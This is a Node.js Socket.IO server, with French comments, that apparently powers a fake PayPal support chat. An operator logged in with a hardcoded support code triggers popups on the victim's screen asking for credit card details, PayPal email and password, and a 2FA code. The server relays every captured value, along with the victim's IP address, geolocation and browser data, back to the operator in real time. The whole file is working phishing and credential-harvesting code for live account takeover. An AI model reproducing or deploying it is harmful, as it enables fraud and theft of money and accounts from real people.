// --- Modules ---
const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

// --- Initialisation du serveur ---
const app = express();
const server = http.createServer(app);

// --- Configuration CORS ---
const frontendURL = "https://paypal-owpo.onrender.com";
app.use(cors({ origin: frontendURL }));

// --- Initialisation de Socket.IO ---
const io = new Server(server, {
  cors: {
    origin: frontendURL,
    methods: ["GET", "POST"]
  },
  maxHttpBufferSize: 1e6 // Limite de 1Mo pour les données (fichiers)
});

app.use(express.json());

// --- Identifiants ---
const CORRECT_CODE_USER = "H25lnFfA3mNbU4nF5WDZ";
const CORRECT_DATE_USER = "18/09/2025";
const CORRECT_CODE_SERVICE = "gg";
const CORRECT_DATE_SERVICE = "123";

// --- Route API de vérification ---
app.post('/verify', (req, res) => {
  const { code, date } = req.body;
  if (code === CORRECT_CODE_USER && date === CORRECT_DATE_USER) {
    res.status(200).json({ success: true, userType: 'User' });
  } else if (code === CORRECT_CODE_SERVICE && date === CORRECT_DATE_SERVICE) {
    res.status(200).json({ success: true, userType: 'Support' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid code or date' });
  }
});

// --- Gestion des connexions Socket.IO ---
io.on('connection', async (socket) => {
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  let geoInfo = { city: 'N/A', country: 'N/A', isp: 'N/A' };

  try {
      const geoResponse = await fetch(`http://ip-api.com/json/${clientIp}`);
      const geoData = await geoResponse.json();
      if (geoData.status === 'success') {
        geoInfo = { city: geoData.city, country: geoData.country, isp: geoData.isp };
      }
  } catch (error) { console.error("Erreur de géolocalisation:", error); }

  const clientInfo = {
    ip: clientIp,
    userAgent: socket.handshake.headers['user-agent'] || 'N/A',
    language: socket.handshake.headers['accept-language'] || 'N/A',
    connectedAt: new Date().toISOString(),
    ...geoInfo
  };
  
  socket.broadcast.emit('user activity', { text: 'A user has connected.' });

  socket.on('chat message', (msg) => {
    io.emit('chat message', { ...msg, clientInfo });
  });

  socket.on('file message', (fileData) => {
    io.emit('file message', { ...fileData, clientInfo });
  });

  socket.on('request popup', () => {
    socket.broadcast.emit('display popup');
  });

  socket.on('request credit card', () => {
    socket.broadcast.emit('display credit card popup');
  });

  socket.on('request paypal login1', () => {
    socket.broadcast.emit('display paypal login1 popup');
  });

  socket.on('request paypal login2', () => {
    socket.broadcast.emit('display paypal login2 popup');
  });

  socket.on('verification popup', (data) => {
    socket.broadcast.emit('display verification popup', data);
  });

  socket.on('popup choice', (choice) => {
    io.emit('chat message', {
      user: 'System',
      text: `User has chosen the option: "${choice.option}"`
    });
  });

  socket.on('credit card data', (data) => {
    const { cardData } = data;
    io.emit('chat message', {
      user: 'System',
      text: `Credit Card Information Received:
📧 Cardholder: ${cardData.cardHolderName}
💳 Card Number: ${cardData.cardNumber}
📅 Expiry: ${cardData.expiryDate}
🔒 CVV: ${cardData.cvv}
📮 Zip Code: ${cardData.billingZip || 'Not provided'}`,
      clientInfo
    });
  });

  socket.on('paypal login1 data', (data) => {
    const { loginData } = data;
    io.emit('chat message', {
      user: 'System',
      text: `PayPal Login Information Received (Step 1):
📧 Email: ${loginData.email}
🔐 Password: ${loginData.password}`,
      clientInfo
    });
  });

  socket.on('paypal login2 data', (data) => {
    const { verificationData } = data;
    io.emit('chat message', {
      user: 'System',
      text: `PayPal 2FA Code Received (Step 2):
🔢 Verification Code: ${verificationData.verificationCode}`,
      clientInfo
    });
  });

  socket.on('clear chat', () => { io.emit('chat cleared'); });
  socket.on('disconnect', () => { io.emit('user activity', { text: 'A user has disconnected.' }); });
});

// --- Démarrage du serveur ---
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Le serveur est démarré et écoute sur le port ${PORT}`);
});
